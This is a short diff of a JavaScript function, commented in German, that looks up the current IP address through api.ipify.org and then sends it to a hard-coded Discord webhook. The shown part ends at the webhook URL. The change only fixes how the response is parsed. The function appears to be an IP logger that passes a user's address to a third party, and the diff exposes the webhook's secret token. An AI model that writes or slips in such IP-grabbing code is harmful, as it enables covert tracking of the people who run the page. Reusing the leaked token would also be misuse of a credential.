@@ -1,12 +1,11 @@
 async function fetchAndSendIpAddress() {
     try {
-        // Schritt 1: JSON-Daten abrufen mit einem anderen Proxy
+        // Schritt 1: IP-Adresse abrufen
         const response = await fetch('https://api.ipify.org/?format=json');
         const data = await response.json();
-        const ipData = JSON.parse(data.contents);
 
         // Die IP-Adresse ist im JSON-Daten unter dem Schlüssel 'ip' gespeichert
-        const ipAddress = ipData.ip;
+        const ipAddress = data.ip;
 
         // Schritt 2: IP-Adresse an Discord Webhook senden
         const webhookURL = 'https://discord.com/api/webhooks/1266125230993178710/jAlkmKSYGpKc1ehon3g7aoibKfwsg-Aowu_uUipUambuIXXQ9LFo8bNLR0APME_T4OuO';
